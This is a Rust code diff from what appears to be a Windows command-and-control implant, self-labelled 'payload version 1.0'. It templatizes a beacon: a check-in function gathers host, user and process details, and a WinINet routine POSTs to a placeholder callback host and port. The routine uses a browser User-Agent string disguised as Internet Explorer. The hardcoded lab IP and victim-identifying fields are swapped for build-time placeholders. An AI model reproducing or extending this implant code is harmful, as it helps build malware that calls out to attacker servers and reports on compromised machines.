@@ -70,15 +70,15 @@ fn generating_checkin_data() ->String {
         "uuid":"73579340-6d53-4d08-ba89-27581c51b6cc",
     });
     
-    let uuid_str = String::from("73579340-6d53-4d08-ba89-27581c51b6cc");
+    let uuid_str = String::from("%UUID%");
     let pid = unsafe{GetCurrentProcessId()};
     
-    update_json_value(&mut checkin_object, "ip", "192.168.69.134");
-    update_json_value(&mut checkin_object, "os", "Windows");
-    update_json_value(&mut checkin_object, "user", "smoke");
-    update_json_value(&mut checkin_object, "host", "DesktopA");
-    update_json_value(&mut checkin_object, "pid", pid);
-    update_json_value(&mut checkin_object, "uuid", uuid_str.clone());
+    //update_json_value(&mut checkin_object, "ip", "%HOSTNAME%");
+    //update_json_value(&mut checkin_object, "os", "Windows");
+    //update_json_value(&mut checkin_object, "user", "smoke");
+    //update_json_value(&mut checkin_object, "host", "DesktopA");
+    //update_json_value(&mut checkin_object, "pid", pid);
+    //update_json_value(&mut checkin_object, "uuid", uuid_str.clone());
   
     let checking_object_string = serde_json::to_string(&checkin_object).unwrap();
     
@@ -92,7 +92,7 @@ pub fn network()  {
     unsafe{
 
         let agent: String = String::from("payload version 1.0");
-        let server_ip: CString = CString::new("192.168.69.134").expect("CString::new failed");
+        let server_ip: CString = CString::new("%CALLBACK-HOST%").expect("CString::new failed");
         let panel_uri: CString = CString::new("data").expect("CString::new failed");
         let http_version: CString = CString::new("HTTP/1.1").expect("CString::new failed");
         let http_verb: CString = CString::new("POST").expect("CString::new failed");
@@ -102,10 +102,12 @@ pub fn network()  {
         let _proxy_bypass_cstr = CString::new(proxy_bypass).expect("CString::new failed");
         let mut uuid: String = String::new();
         // Headers string
-        let header = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+        //let header = "User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+        let header = "%USER-AGENT%";
         let header_cstr = CString::new(header).expect("CString::new failed");
         let header_ptr = header_cstr.as_ptr();
         let mut bytes_to_read: u32 = 0;
+        let callback_port = %CALLBACK-PORT%;
 
         //debug for proxy
         //let io_handle = InternetOpenA(agent.as_ptr() as *const i8, /*INTERNET_OPEN_TYPE_PRECONFIG*/INTERNET_OPEN_TYPE_PROXY, _proxy_cstr.as_ptr(),_proxy_bypass_cstr.as_ptr(), 0); //creates a session context to maintain details about the HTTP session
@@ -118,7 +120,7 @@ pub fn network()  {
         
 
         /*loop*/ {
-            let ic_handle = InternetConnectA(io_handle, server_ip.as_ptr() as *const i8, 80, ptr::null_mut(), ptr::null_mut(), INTERNET_SERVICE_HTTP, 0, 0);
+            let ic_handle = InternetConnectA(io_handle, server_ip.as_ptr() as *const i8, callback_port, ptr::null_mut(), ptr::null_mut(), INTERNET_SERVICE_HTTP, 0, 0);
 
             println!("[*] Error report from InternetConnectA API{}", GetLastError());
 
